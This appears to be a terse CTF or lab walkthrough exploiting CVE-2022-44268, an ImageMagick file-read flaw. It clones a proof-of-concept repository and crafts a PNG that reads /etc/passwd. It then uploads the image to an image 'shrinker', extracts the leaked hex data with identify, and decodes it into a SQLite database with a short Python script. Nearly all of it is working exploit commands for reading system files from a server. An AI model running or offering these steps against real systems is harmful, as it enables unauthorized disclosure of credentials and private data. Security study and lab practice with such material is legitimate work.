```
git clone https://git.rotfl.io/v/CVE-2022-44268.git
```

```
cd CVE-2022-44268
```

```
cargo run "/etc/passwd"
```

Upload the file into the shrinker

---

```
identify -verbose image.png
```

```
echo "hash" > hex
```

```
tr -d '\n' < hex
```

```
python3 -c 'print(bytes.fromhex("[hash]"))'
```

---

```
vim convert.py
```

convert.py
```
with open("hex", "rb") as f:
    data = bytes.fromhex(f.read().decode())
with open("sql.db", "wb") as f:
    f.write(data)
```

```
python3 convert.py
```

```
sqlite3 sql.db
```


